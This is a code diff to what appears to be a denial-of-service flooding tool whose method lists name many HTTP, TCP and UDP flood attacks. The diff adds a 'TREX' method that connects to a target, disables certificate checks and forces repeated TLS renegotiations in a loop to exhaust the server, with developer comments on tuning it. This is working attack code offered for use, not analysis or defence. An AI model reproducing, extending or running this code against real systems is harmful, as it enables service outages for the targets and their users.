@@ -8,6 +8,7 @@ from copy import copy
 from functools import partial
 from os import urandom as randbytes
 from socket import (SOL_SOCKET, SO_RCVBUF, inet_ntoa)
+import socket as _socket
 from ssl import CERT_NONE, SSLContext, create_default_context
 from string import ascii_letters
 from threading import Event
@@ -16,6 +17,9 @@ from urllib import parse
 
 import aiohttp
 import async_timeout
+# XXX: fix import
+# XXX: add openssl library as a dependency
+from OpenSSL.SSL import *
 from yarl import URL
 
 from . import proxy_proto
@@ -48,9 +52,11 @@ class Methods:
     HTTP_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
         "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
-        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
+        # XXX: this is not HTTP method but it's easier to test this way
+        "TREX" 
     }
-    TCP_METHODS: Set[str] = {"TCP"}
+    TCP_METHODS: Set[str] = {"TCP", }
     UDP_METHODS: Set[str] = {
         "UDP", "VSE", "FIVEM", "TS3", "MCPE",
         # the following methods are temporarily disabled for further investigation and testing
@@ -598,6 +604,62 @@ class AsyncTcpFlood:
                 yield FloodOp.WRITE, (p2, p2_size)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
+
+    async def TREX(self, on_connect=None) -> bool:
+        # XXX: what about proxies?
+        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM, _socket.IPPROTO_TCP)
+        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+        sock.setblocking(False)
+        # XXX: timeout
+        await self._loop.sock_connect(sock, self._raw_target)
+        self._stats.track_open_connection()
+
+        # XXX: cache context object
+        ctx = Context(TLSv1_2_METHOD)
+        # XXX: more ciphers, make sure RSAs are used
+        ctx.set_cipher_list(b"ECDHE-RSA-AES256-GCM-SHA384")
+        ctx.set_verify(VERIFY_NONE, None)
+        # XXX: unfortunetly, pyOpenSLL does not have support from SSL_CTX_set_msg_callback()
+        #      but maybe we can use info callback to track incoming vs. outgoing traffic
+        # ctx.set_info_callback(lambda *args: print(args))
+
+        conn = Connection(ctx, sock)
+        conn.set_connect_state()
+        # XXX: i assume this is not required if we use VERIFY_NONE
+        # conn.set_tlsext_host_name(self._target.authority.encode())
+
+        on_done = self._loop.create_future()
+
+        # XXX: track budget
+        def _write(re=False, num=0):
+            if re:
+                # XXX: OpenSSL's API is quite weird, actually operation is going
+                #      to be performed only when next read/write is done
+                conn.renegotiate()
+            try:
+                conn.do_handshake()
+            except WantReadError:
+                self._loop.add_reader(sock, partial(_write, False, num))
+            except Exception as e:
+                # XXX: it seems like the connection is getting closed after ~150 blocks
+                # print(num, e)
+                self._loop.remove_reader(sock)
+                # XXX: EOF while reading is the only "Okaish" error here
+                #      otherwise we have to close sock explicitly from our side
+                self._stats.track_close_connection()
+                if not on_connect.done():
+                    on_connect.set_exception(e)
+                if not on_done.done():
+                    on_done.set_exception(e)
+            else:
+                self._loop.remove_reader(sock)
+                if num > 0 and not on_connect.done():
+                    on_connect.set_result(True)
+                self._stats.track(1, 1)
+                self._loop.call_soon(partial(_write, True, num+1))
+
+        self._loop.call_soon(partial(_write, False))
+        return await on_done
 
 
 class AsyncUdpFlood:
